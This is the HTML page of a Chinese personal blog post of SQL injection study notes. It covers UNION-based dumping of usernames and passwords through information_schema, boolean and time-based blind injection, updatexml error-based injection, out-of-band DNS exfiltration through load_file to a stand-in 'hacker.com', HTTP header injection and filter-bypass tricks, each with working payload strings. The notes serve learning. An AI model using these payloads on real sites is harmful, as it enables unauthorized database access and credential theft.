@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Inter:300,300italic,400,400italic,700,700italic|Noto Sans SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|JetBrains Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ctwabc.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#4A90D9","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总的来说就是字符串的拼接字符串 测试有没有sql注入 ’ 报错说明有三个‘ 可以字符串拼接 ‘ and 1&#x3D;1 正常 and前面得是true ‘ and 1&#x3D;2 异常 and前面得是true 这样说明页面可控，就可能有sql注入漏洞 万能密码:1&#39; or &#39;1&#39; &#x3D; &#39;1 union select联合查询: select first_name f">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql">
+<meta property="og:url" content="http://ctwabc.github.io/2026/06/11/sql/index.html">
+<meta property="og:site_name" content="ctwabc&#39;s Blog">
+<meta property="og:description" content="总的来说就是字符串的拼接字符串 测试有没有sql注入 ’ 报错说明有三个‘ 可以字符串拼接 ‘ and 1&#x3D;1 正常 and前面得是true ‘ and 1&#x3D;2 异常 and前面得是true 这样说明页面可控，就可能有sql注入漏洞 万能密码:1&#39; or &#39;1&#39; &#x3D; &#39;1 union select联合查询: select first_name f">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ctwabc.github.io/2026/06/11/sql/sql1.png">
+<meta property="article:published_time" content="2026-06-11T11:12:54.000Z">
+<meta property="article:modified_time" content="2026-06-11T11:57:45.040Z">
+<meta property="article:author" content="ctwabc">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ctwabc.github.io/2026/06/11/sql/sql1.png">
+
+<link rel="canonical" href="http://ctwabc.github.io/2026/06/11/sql/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+
+<style>
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: -2;
+    /* Fallback gradient when wallpaper API fails */
+    background: linear-gradient(135deg, #e8f0fe 0%, #f3e8ff 25%, #fce4ec 50%, #e8f5e9 75%, #e3f2fd 100%);
+    background-size: 400% 400%;
+    animation: gradientShift 20s ease infinite;
+  }
+
+  @keyframes gradientShift {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+</style>
+
+
+<meta property="og:image" content="https://github.com/ctwabc.png">
+<meta name="twitter:card" content="summary">
+
+  <title>sql | ctwabc's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ctwabc's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">学习笔记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ctwabc.github.io/2026/06/11/sql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://github.com/ctwabc.png">
+      <meta itemprop="name" content="ctwabc">
+      <meta itemprop="description" content="学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ctwabc's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name_posts/sql.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pencil-alt"></i></a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-06-11 19:12:54 / 修改时间：19:57:45" itemprop="dateCreated datePublished" datetime="2026-06-11T19:12:54+08:00">2026-06-11</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>总的来说就是字符串的拼接字符串</p>
+<p><em><strong>测试有没有sql注入</strong></em></p>
+<p>’ 报错说明有三个‘ 可以字符串拼接</p>
+<p>‘ and 1&#x3D;1 正常 and前面得是true</p>
+<p>‘ and 1&#x3D;2 异常 and前面得是true</p>
+<p>这样说明页面可控，就可能有sql注入漏洞</p>
+<p>万能密码:<code>1&#39; or &#39;1&#39; = &#39;1</code></p>
+<p>union select联合查询:</p>
+<p>select first_name from user_system_data union select login_count from user_data;</p>
+<p>联合查询要满足两个条件</p>
+<p>1.union前面select的数量和union后面select的数量要相同。</p>
+<p>也就是说select 1，2 from user union select 3，4 from password； 这样是可以的</p>
+<p>select 1，2，3 from user union select 4，5 from password； 这样是不行的</p>
+<p>2.查询的数据类型要相匹配</p>
+<p>可以是用order by来查清楚union前面select了几个。</p>
+<p>order by后面是可以写数字的，数字代表了第几列。</p>
+<p>也就是说order by 1的话就会按第一列排序，order by 2的话就会按第二列排序，order by 3的时候列数是不够的，数据库就会报错了，列数够的话就不会报错。</p>
+<p>所以我们就可以通过这个反应知道有几列。</p>
+<p>还有一种方式是使用NULL，也就是union select NULL— -，union select NULL，NULL— -以此类推，这样就能知道有几列了。这主要是因为NULL对于各种数据类型是兼容的。NULL的另一个用处就是知道每一列对应的数据类型，我们可以这样，在知道了有几列以后，union select ‘a’,NULL,NULL— -通过一个个的不断调整数据类型，直到匹配上，我们就知道数据类型是什么了。（注意这里的注释需要写成— -必须有这个空格，要不然会把—认为是字段）</p>
+<p>联合查询的一大用处就是可以查其他表的感兴趣的内容，还有一个就是可以使用返回对应数据类型的函数。</p>
+<p>例如</p>
+<p><strong>database()</strong>：获取当前数据库名。</p>
+<p><strong>user()</strong>：获取当前数据库用户名。</p>
+<p><strong>version()</strong>：获取数据库版本。</p>
+<p>SELECT id, title, content FROM articles WHERE id &#x3D; 1 UNION SELECT 1, database(), version()– -</p>
+<p>group_concat():联合查询的时候如果只显示一行的话就可以用这个函数，他会列指定的列里数据全部以一行的形式展示出来（其实不是全部由大小限制）。</p>
+<p>concat():主要用处是：<strong>把多个列的数据或者字符串，首尾相连地拼成一个大字符串。</strong></p>
+<p>网页通常只有一个显示位，黑客如果用了 UNION SELECT，一次只能看一个字段。如果黑客既想看用户名，又想看密码，难道要查两次吗？</p>
+<p>不需要，用 concat() 把它们打包成一句话：</p>
+<p><code>UNION SELECT 1, concat(username, &#39;:&#39;, password), 3 FROM users--+</code></p>
+<p>concat_ws():它是 concat() 的升级版 CONCAT_WS(‘分隔符’, 字段1, 字段2, 字段3…)</p>
+<p>limit():用来<strong>限制查询结果返回的行数</strong>。它有两个参数：LIMIT 偏移量, 几行</p>
+<p>LIMIT 0, 1：从第 0 行（也就是第 1 条数据）开始，只拿 1 行。</p>
+<p>LIMIT 1, 1：从第 1 行（也就是第 2 条数据）开始，只拿 1 行。</p>
+<p>group_concat()不让用了，或者对于展示的数据有大小限制什么的话，就可以用这个函数来显示别的行了</p>
+<p>任何人在 MySQL 中创建的每一个数据库、每一张表、每一个字段，都会被 MySQL 自动记录在一个叫 information_schema 的系统自带库里。</p>
+<p>你可以把它理解为<strong>数据库的中央档案馆</strong>。其中有两张表是黑客的财富密码：</p>
+<ul>
+<li><strong>information_schema.tables</strong>：记录了整个 MySQL 里面<strong>所有的表名</strong>。</li>
+<li><strong>information_schema.columns</strong>：记录了整个 MySQL 里面<strong>所有的列名（字段名）</strong>。</li>
+</ul>
+<p>在这张地图里，有两个核心字段需要认清：</p>
+<ul>
+<li>table_schema：代表这张表属于哪个<strong>数据库</strong>。</li>
+<li>table_name：代表这张表的<strong>表名</strong>。</li>
+</ul>
+<p>如果我们在普通的数据库命令行里，想查出 security 这个数据库里有哪些表，我们会写这样一句标准的 SQL：</p>
+<p><code>SELECT table_name FROM information_schema.tables WHERE table_schema = &#39;security&#39;;</code></p>
+<p>联合查询中的应用:</p>
+<p><code>-1&#39; UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = database()-- - </code></p>
+<p><em><strong>sql盲注</strong></em></p>
+<p>盲注就是不会让你看到你查询的信息。</p>
+<p>SUBSTRING(字符串, 开始位置, 截取长度)</p>
+<p>布尔型：</p>
+<p>虽然不会显示数据但会显示是否正常。</p>
+<p>所以说我们可以将要查询的一个字母一个字母的爆破，爆破对了她就会显示正常，错了就显示失败了。</p>
+<p>SELECT * FROM users WHERE id &#x3D; ‘1’ AND ascii(substr(database(),1,1)) &gt; 100 –+’</p>
+<p>可以通过二分发爆破出数据库的第一个字母，以此类推。and前面部分保证是正确的。</p>
+<p>ascii就是把它转换成ascii码，这样能避免使用‘（不用ascii的话就得跟字母比较就得写成‘a了），防火墙可能会把’给挡掉。</p>
+<p>时间型:</p>
+<p>他的回答不会因为是否正确而改变的话，可以这样写：</p>
+<p>– 问数据库：如果数据库名字的第一个字母是 ‘s’，你就给我睡 5 秒，否则返回 0</p>
+<p>?id&#x3D;1’ AND IF(substr(database(),1,1)&#x3D;’s’, sleep(5), 0) –+</p>
+<p><em><strong>报错注入</strong></em></p>
+<p>黑客故意输入错误的语法，强行引发数据库报错；但黑客在这段语法里塞了“私货”（比如查密码的命令），导致数据库在报错信息中，不小心把黑客想要的秘密给一起打印在屏幕上了。</p>
+<p>要想使用这个漏洞需要满足两个条件:</p>
+<p><strong>后端代码太粗心：</strong> 网站的开发人员没有关闭数据库的“错误回显”。程序在出错时，会毫无遮掩地把数据库报的错误原封不动地打印在网页上（例如：MySQL Error: …）。</p>
+<p><strong>利用了特定函数的逻辑漏洞：</strong> 数据库中有些函数，当接收到不符合规范的参数时，会把<strong>这个参数的内容</strong>直接放进报错信息里弹出来。</p>
+<p>updatexml(参数1, 参数2, 参数3):其中<strong>第二个参数</strong>要求必须是一个合法的 <strong>XPath 格式路径</strong>（类似于文件夹路径，比如 &#x2F;root&#x2F;user)</p>
+<p>– 故意制造路径错误的 Payload,塞进一个<strong>绝对不符合 XPath 路径规范的特殊字符</strong>（比如波浪号 ~），紧接着在后面拼接上想偷的数据（如 database()）。</p>
+<p>?id&#x3D;1’ AND updatexml(1, concat(‘~’, database()), 1) –+</p>
+<p>数据库会这样回答:ERROR 1105 (HY000): XPATH syntax error: ‘~security’</p>
+<p>?id&#x3D;1’ AND updatexml(1, concat(‘~’, (SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1)), 1) –+可以这么用</p>
+<p><strong>updatexml 报错注入，报错的回显最多为32位</strong></p>
+<p>extractvalue(XML_document，xpath_string)这个也一样</p>
+<p>1 or (extractvalue(1,concat(‘～’,(这里填写sql语句))))</p>
+<p>带外sql注入</p>
+<p>当网站做到了极致的防御：网页上<strong>不显示任何数据</strong>（无法 Union），<strong>不显示任何报错</strong>（无法报错注入），甚至还加了<strong>严格的频率限制</strong>（一旦你用盲注高频猜解，IP立刻被拉黑）。</p>
+<p>这时候，黑客就会利用<strong>带外通道</strong>：让受害服务器的数据库<strong>自己主动联网，把数据发送到黑客掌控的另一台外部服务器上</strong>。</p>
+<p>利用数据库自带的、可以发起网络请求的内置函数。最常被用来建立这种“带外通道”的协议是 <strong>DNS（域名系统）</strong>。</p>
+<p>MySQL 数据库在 Windows 服务器环境下（必须是windows）</p>
+<p>在 Windows 系统中，如果你尝试访问一个形如 \xxx.com\abc 的网络共享路径（称为 UNC 路径），系统为了解析 xxx.com 在哪里，会<strong>强制发送一个 DNS 请求</strong>。 MySQL 的 load_file() 函数正好支持读取网络路径。</p>
+<p>控制了hacker.com</p>
+<p>?id&#x3D;1’ AND load_file(concat(‘\\‘, (SELECT database()), ‘.hacker.com\abc’)) —+(在 SQL 语法中，<strong>反斜杠 \ 是一个特殊的“转义符”</strong>。它的作用是改变紧跟在它后面的那个字符的原本含义。 例如：&#39; 意味着“这只是一个普通的单引号字符，不是字符串的边界”。所以写了四个)</p>
+<p>concat会讲它拼成\数据库名称.<a target="_blank" rel="noopener" href="http://hacker.com/">hacker.com</a>\abc</p>
+<p>load_file() 尝试去读取这个路径。为了找到这个路径，受害服务器开始查 DNS。</p>
+<p>解释一下DNS解析：</p>
+<p>当受害服务器大喊：“谁知道 security.hacker.com 的 IP 是多少？”时，全球的 DNS 解析网络开始了一场接力赛：</p>
+<ol>
+<li><strong>第一步：询问“根域名服务器”</strong> DNS 问：“哪里能找到 .com 区域？” 根服务器回答：“我知道，去 .com 的顶级域名服务器找。”</li>
+<li><strong>第二步：询问 .com 顶级域名服务器</strong> DNS 问：“哪里能找到 hacker.com？” .com 服务器查了查档案（黑客注册域名时的记录），回答：“这个域名被黑客买下了，他自己搭了一台<strong>权威 DNS 服务器</strong>来管理，IP 是 X.X.X.X。你去问他吧！”</li>
+<li><strong>第三步：致命的一步，流量直接进入黑客的服务器</strong> 全球的 DNS 系统于是转头去问黑客的这台服务器（X.X.X.X）：“喂，你家主人买的 hacker.com 下面，有一个叫 <strong>security</strong> 的子域名，它的 IP 是多少？”</li>
+</ol>
+<p>http标头注入</p>
+<p><strong>场景：</strong> 很多网站为了做数据统计，会记录每一个访问者的浏览器版本。</p>
+<p>User-Agent 标头注入</p>
+<p>后端代码写成了这样:</p>
+<p><img src="/2026/06/11/sql/sql1.png" alt="截图"></p>
+<p>User-Agent: ‘ AND updatexml(1, concat(‘~’, database()), 1) AND ‘1’&#x3D;’1</p>
+<p>INSERT INTO login_log (user_agent, ip) VALUES (‘’ AND updatexml(1, concat(‘~’, database()), 1) AND ‘1’&#x3D;’1’, ‘127.0.0.1’)</p>
+<p>X-Forwarded-For 或 Client-IP 标头注入（伪造 IP 地址）</p>
+<p><strong>场景：</strong> 很多网站有防刷机制、或者登录日志系统，需要记录用户的真实 IP。 因为有很多用户使用代理服务器，程序员会去读取 HTTP 头部专门记录代理路径的字段——X-Forwarded-For（简称 XFF）。</p>
+<p>其实就是更改标头字段，写正常sql注入语句就好了。</p>
+<p>Cookie 标头注入（劫持身份令牌）</p>
+<p><strong>场景：</strong> 网站为了维持你的登录状态，会给浏览器发一串 Cookie。很多时候，后端在验证你的权限或者记录浏览历史时，会去数据库里查这个 Cookie。</p>
+<p>像这样</p>
+<p>SELECT * FROM sessions WHERE session_id &#x3D; ‘用户请求里的Cookie’</p>
+<p>Cookie: sess_id&#x3D;abc’ AND sleep(5) – - 网站突然卡了5秒就说明可以注入了</p>
+<p>Referer 标头注入（追踪来源网页）</p>
+<p><strong>场景：</strong> 网站想统计用户是从哪个外部链接跳过来的（比如是从百度还是从谷歌），就会读取 Referer 标头，并存入数据库。</p>
+<p>具体注入具体分析</p>
+<p>一些绕过方法:</p>
+<p>1.大小写绕过uNiOn啥的</p>
+<p>2.双写绕过UUNiioon</p>
+<p>3.特殊编码绕过</p>
+<p>4.两个空格 Tab</p>
+<p>5.注释 &#x2F;**&#x2F;像这样的空注释</p>
+<p>参考文章: <a target="_blank" rel="noopener" href="https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/03/22/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1-SQL-%E6%B3%A8%E5%85%A5/</a></p>
+<p><a target="_blank" rel="noopener" href="https://windeskybb.work/archives/67cd1c1b-3998-4182-be62-a4fc6aca43f3">https://windeskybb.work/archives/67cd1c1b-3998-4182-be62-a4fc6aca43f3</a></p>
+
+    </div>
+
+    
+    
+    
+<div style="margin-top: 48px; padding-top: 24px; border-top: 1px solid rgba(128,128,128,0.15); text-align: center; color: #999; font-size: 0.88em;">
+  <p>感谢阅读 🙏 如果这篇文章对你有帮助，欢迎分享给更多人。</p>
+</div>
+
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/06/11/encoding/" rel="prev" title="编码">
+      <i class="fa fa-chevron-left"></i> 编码
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ctwabc"
+      src="https://github.com/ctwabc.png">
+  <p class="site-author-name" itemprop="name">ctwabc</p>
+  <div class="site-description" itemprop="description">学习笔记</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
+    Chat
+  </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ctwabc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ctwabc" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+<div class="sidebar-github-link">
+  <a href="https://github.com/ctwabc" target="_blank" rel="noopener">
+    <i class="fab fa-github"></i> Star on GitHub
+  </a>
+</div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ctwabc</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div><div class="custom-footer">
+  <span>用代码记录世界，用安全守护代码  ·  <i class="fa fa-coffee"></i>  用心写作</span>
+</div>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script>
+(function() {
+  // Wallpaper fallback: if the image fails to load, keep the gradient
+  var bgImg = new Image();
+  bgImg.src = 'https://api.paugram.com/wallpaper/';
+  bgImg.onload = function() {
+    document.body.style.backgroundImage = 'url(https://api.paugram.com/wallpaper/)';
+  };
+
+  // Smooth scroll for anchor links
+  document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
+    anchor.addEventListener('click', function(e) {
+      var target = document.querySelector(this.getAttribute('href'));
+      if (target) {
+        e.preventDefault();
+        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    });
+  });
+
+  // Intersection Observer for scroll-triggered fade-in
+  if ('IntersectionObserver' in window) {
+    var observer = new IntersectionObserver(function(entries) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          entry.target.style.opacity = '1';
+          entry.target.style.transform = 'translateY(0)';
+          observer.unobserve(entry.target);
+        }
+      });
+    }, { threshold: 0.1 });
+
+    document.querySelectorAll('.post-block').forEach(function(el) {
+      el.style.opacity = '0';
+      el.style.transform = 'translateY(20px)';
+      el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+      observer.observe(el);
+    });
+  }
+})();
+</script>
+
+</body>
+</html>
